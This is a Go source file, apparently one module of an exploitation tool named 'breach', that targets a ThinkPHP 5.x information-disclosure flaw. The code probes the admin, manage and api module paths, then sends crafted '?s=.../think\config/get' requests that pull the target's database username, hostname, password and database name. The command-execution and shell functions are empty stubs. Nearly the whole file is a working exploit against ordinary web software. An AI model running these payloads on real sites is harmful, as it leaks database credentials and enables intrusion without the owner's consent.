package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
)

type TP5DBModule struct {
	BaseUrl       string
	feature       string
	moduleList    []string
	currentModule string
}

func (t *TP5DBModule) CheckVul() *util.Response {
	for _, s := range t.moduleList {
		resp, err := http.Get(t.BaseUrl + "/?=/" + s)
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			t.currentModule = s
			break
		}
	}
	if t.currentModule == "" {
		return util.Fail("no vulnerable")
	}
	payloadUrls := []string{
		t.BaseUrl + "/?s=" + t.currentModule + "/think\\config/get&name=database.username",
		t.BaseUrl + "/?s=" + t.currentModule + "/think\\config/get&name=database.hostname",
		t.BaseUrl + "/?s=" + t.currentModule + "/think\\config/get&name=database.password",
		t.BaseUrl + "/?s=" + t.currentModule + "/think\\config/get&name=database.database",
	}
	for _, payloadUrl := range payloadUrls {
		resp, err := http.Get(payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if len(string(bytes)) < 20 {
			return util.Success(t.feature, payloadUrl)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP5DBModule) ExecVul(cmd string) *util.Response {
	return util.Fail("no vulnerable")
}

func (t *TP5DBModule) GetShell() *util.Response {
	return util.Fail("no vulnerable")
}

func NewTP5DBModule(baseUrl string) *TP5DBModule {
	return &TP5DBModule{
		BaseUrl:    baseUrl,
		feature:    "ThinkPHP 5.x 数据库信息泄露",
		moduleList: []string{"manage", "admin", "api"},
	}
}
